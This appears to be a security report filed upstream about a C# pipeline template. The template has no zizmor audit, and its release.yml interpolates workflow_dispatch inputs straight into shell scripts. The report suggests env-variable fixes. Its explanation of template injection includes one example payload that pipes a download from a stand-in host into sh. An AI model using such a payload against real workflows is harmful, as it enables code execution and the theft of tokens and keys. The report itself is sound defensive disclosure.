# Upstream report 4 - the csharp template has no zizmor job, and its `release.yml` has four high-severity template injections

**Target:** `link-foundation/csharp-ai-driven-development-pipeline-template`

**Severity:** four `workflow_dispatch` inputs are interpolated straight into
`run:` blocks in jobs that hold `GITHUB_TOKEN` and a NuGet API key. The other
four templates run the audit that finds this; this one does not.

---

## Title

`workflows.yml` runs actionlint but not zizmor, and there is no
`.github/zizmor.yml`; adding it surfaces 4 high-severity `template-injection`
and 2 high-severity `excessive-permissions` findings

## What is missing

The `rust`, `js`, `python` and `php` templates all ship `.github/zizmor.yml`
and a `zizmor` job in `.github/workflows/workflows.yml` beside actionlint. The
`csharp` template ships neither:

```console
$ ls .github/zizmor.yml
ls: cannot access '.github/zizmor.yml': No such file or directory
$ grep -c zizmor .github/workflows/workflows.yml
0
```

`security.yml` has `codeql` and `dependency-review` jobs, and its CodeQL matrix
is `[csharp, actions]`, so the pipeline is not entirely unexamined -- CodeQL's
Actions analysis carries code-injection queries of its own. But that is exactly
the configuration the other four templates have *as well as* zizmor, not
instead of it, and the difference matters in two ways:

- CodeQL reports to the Security tab via `security-events: write`. That is a
  page someone has to visit, and it depends on code scanning being enabled for
  the repository. The zizmor job in the other four templates is configured with
  `advanced-security: false` and `annotations: true` precisely so the result is
  a red check on the pull request that introduced it.
- `dependency-review` is gated on `github.event_name == 'pull_request'`, and
  CodeQL's Actions queries and zizmor's audits are not the same set. The
  findings below are what zizmor reports; whether CodeQL also reports some of
  them is not something this repository can observe from outside.

So the accurate statement is narrower than "nothing looks at the pipeline": the
csharp template is the one template of five that does not run the audit the
other four run, and that audit currently has six high-severity things to say.

## Findings

zizmor 1.29.0 (the version `zizmorcore/zizmor-action@v0.6.2` actually runs),
invoked exactly as the other four templates invoke it, at commit
`83efb9e4482ffed9c9ef1c7b07ea250ac6d3b141`:

```console
$ zizmor --min-confidence medium --persona regular .github/workflows
...
73 findings (43 ignored, 16 suppressed, 3 unsafe fixes):
  2 informational, 0 low, 6 medium, 6 high
```

The six high-severity ones:

### 4x `template-injection` -- `release.yml`

```
error[template-injection]: code injection via template expansion
   --> .github/workflows/release.yml:616:30
616 |             --bump-type "${{ github.event.inputs.bump_type }}" \
    |                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ may expand into attacker-controllable code

   --> .github/workflows/release.yml:617:32
617 |             --description "${{ github.event.inputs.description }}" \

   --> .github/workflows/release.yml:767:28
767 |           'MyPackage': ${{ github.event.inputs.bump_type }}

   --> .github/workflows/release.yml:770:15
770 |           ${{ github.event.inputs.description || 'Manual release' }}
```

`${{ }}` in a `run:` block is textual substitution performed *before* the shell
sees the script, so quoting inside the script does not help: the value becomes
part of the program. A `workflow_dispatch` description of

```
x"; curl -sSf https://example.test/p | sh; echo "
```

runs as its own command in a job that holds `secrets.GITHUB_TOKEN` and, on the
publish path, `NUGET_API_KEY`. Three of the four carry an auto-fix.

This is the same defect, in the same file, that
`link-assistant/formal-ai` found in its own `release.yml` the first time it
ran zizmor (its issue #1076) -- four findings, both inputs, both step kinds.
It is not a hypothetical class.

### 2x `excessive-permissions` -- `docs.yml`

```
error[excessive-permissions]: overly broad permissions
  --> .github/workflows/docs.yml:31:3
31 |   pages: write
   |   ^^^^^^^^^^^^ pages: write is overly broad at the workflow level

  --> .github/workflows/docs.yml:32:3
32 |   id-token: write
```

Workflow-level rather than job-level, so every job in the file gets them,
including any that only reads.

The remaining 6 medium findings are `excessive-permissions` from jobs with no
`permissions:` block at all in `release.yml`, and 2 informational
`use-trusted-publishing` on the two `dotnet nuget push --api-key` sites.

## Suggested fix

**1. Fix the four injections.** Every one of these steps already declares the
value in `env:` and then uses the raw expression anyway, so the fix is to use
the variable that is already there:

```diff
+        env:
+          BUMP_TYPE: ${{ github.event.inputs.bump_type }}
+          DESCRIPTION: ${{ github.event.inputs.description }}
         run: |
-            --bump-type "${{ github.event.inputs.bump_type }}" \
-            --description "${{ github.event.inputs.description }}" \
+            --bump-type "$BUMP_TYPE" \
+            --description "$DESCRIPTION" \
```

An environment variable is passed to the shell as data, not spliced into the
program text, so quoting works again. `zizmor --fix` produces this for three
of the four.

**2. Adopt the other templates' zizmor job.** Copy `.github/zizmor.yml` and the
`zizmor` job from the `rust` template. Two notes from adopting it downstream:

- Set `inputs:` explicitly. The action defaults it to `.`, the whole
  repository, which audits any archived or vendored workflow files as though
  they were live pipeline.
- Set `version:` explicitly. The action resolves versions from a static table
  shipped inside it, and v0.6.2's table stops at 1.29.0 -- so `latest` there is
  not the latest zizmor.

**3. While adding it, consider the narrow pedantic pass** described in the
companion report on `unpinned-images`: at
`--persona pedantic --min-severity high --min-confidence high` this template
reports 7 of 73 findings -- the 6 above plus the unpinned actionlint image --
and nothing else.

## Related

- <https://docs.zizmor.sh/audits/#template-injection>
- <https://github.com/link-assistant/formal-ai/issues/1076> -- the same four
  findings, in the same file, downstream.
